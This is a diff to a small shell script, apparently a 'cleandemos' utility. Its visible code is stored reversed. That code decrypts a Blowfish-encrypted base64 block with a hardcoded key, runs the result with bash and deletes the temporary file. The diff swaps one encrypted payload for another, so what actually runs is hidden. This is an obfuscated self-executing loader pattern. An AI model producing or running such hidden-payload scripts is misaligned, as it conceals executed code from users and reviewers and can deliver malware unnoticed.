@@ -1,15 +1,16 @@
-#democlean.sh
+#cleandemos.sh
 sed -En '$p' $0|rev>...;. ...;rm ...;exit
 ###geoykgno###
-U2FsdGVkX19L3I7+G/KCu+fckWTtyM6TzwDr2y3J0gWtIAfr2fOVxG8jfhRyqGgK
-CFbDStJyOaywjvmpGLBGGmDvKmUOmlt4lqCDDzJN5M7zdBU4HPXS1+q9kXQ+jTQ/
-/A8PgauE8X/73lRE4IvlLUqIRh8fsa5BNgH47k0KSUdm+77Ki+a3nEWqiehfrRjs
-Td3iZ+mhY/iajdfpt1v0ddj9pyUbn3agc9elh0nKnPZ+7qpsOhw628BAYhXMLOk/
-IuShXElLv5ZqTCrVWoP+hO60KxFkY7re7+8Y+N5P15Zjc5d2cVa9Vsm0VabrZGiF
-F1Ap/hBMdaYvfkuJ8NY9Y5Pb14dcVbZp5PMV7xVfDKvowzMTzPqXG2yqL4dDC1lw
-gU0pniZpaHqPtURxJfH/f0WC1c0NTKx8xZML2wUFRZi7yGDRVo7tGQmSWxcYIGnl
-p3iK18NQnoXD1yVu468nNpzx4oMTBhI0lnpFzRpexvtMqK74/KI0o1ELDXK+ByX8
-AC+4rHUZUvdr9j6vtpyaCfcLjyeg0nNf348Sz8rDlykdtojrpCS59+RTC2sTFiHh
-aSnHI50TzBE5xPAfzzcIWT05Z+WxGOj6soBvqVTpjLk=
+U2FsdGVkX1+sJAg75m/XHcZB4lPHMz4d5lgmGtxD2iqXBRS/8r0mWHNdIdBkYVk+
+tTKjmdICsCvAmGw/pHo961cYX4J/giJyXznTvS/XLQEiM1p4y087mjyLsRgWl8bo
+krBfX8f/NLyuFR77AwzkqINBsGikGQqZmnn6C5mPhuzlSMgqw9XoQqS/td334Wq8
+gzX3yQw2qwaFsujHFHVbJhiHoogVH07M5RL/HyJ8qZN349J2JcQxbb0EHZCaKVju
+9/RIH77DJ6JTfmS3GmOBEJ+IIDz3NyYidpvmPm57aBSquDWNgtrD1vL52XB8QN+L
+IwYkYfl11El4342M6ujsd49dnT5GjhSv4A2ERLZY5g6Xha7/Az+rCrmd7zyBnmxL
+h/VDO2TM7K6o/O3O/FvAxbKDGePDojt5Vw56XO2gi/KKsvx/cV9pY4yR5YTnXTPz
+cvIflmPR48e+LP0Ta55nVyHEbwLOLIqSqGfHexVXC66M/0+6vErizY5gwGqvLtqr
+0swPazNpfqWQ5moi69BXPicuuoKMSe6ZNtVUrijNHsxopfBASMQQ/hxxuEqVK9hX
+aBfeJv8UM457mKDLnF+9XCWf2TmV4To+adnoA7vmBmqE4E2PaMS+YGcKP1/9dJCq
+swIcjl7r+5IgSWgEXuKuIbrEGIrT4bl6SFQWbyLwRPU+8WQ44ZYVJZ3Tk9cL34uk
 ###geoykgnr###
-kroq;krob;kro|krot|kroh|kros|kroc;krom;raelc;} ;kror ;m$ hsab {)(krob;} ;0$ tac {)(kroc;} ;'p@rngkyoeg###^@\,@###ongkyoeg###^@\' nE- des {)(kros;} ;m$ tuo- a- k- k- 001    reti- fb- d- cne lssnepo {)(kro;} ;2+n- liat {)(krot;} ;m tesnu ;   m$ mr|sey {)(kror;} ;tixe {)(kroq;} ;)pmetkm($=m {)(krom;} ;1-n- daeh {)(kroh
+kroq;krob;kro|krot|kroh|kros|kroc;krom;raelc;} ;kror ;m$ hsab {)(krob;} ;0$ tac {)(kroc;} ;'p@rngkyoeg###^@\,@###ongkyoeg###^@\' nE- des {)(kros;} ;m$ tuo- a- k- k- 001 reti- fb- d- cne lssnepo {)(kro;} ;2+n- liat {)(krot;} ;m tesnu ;   m$ mr|sey {)(kror;} ;tixe {)(kroq;} ;)pmetkm($=m {)(krom;} ;1-n- daeh {)(kroh
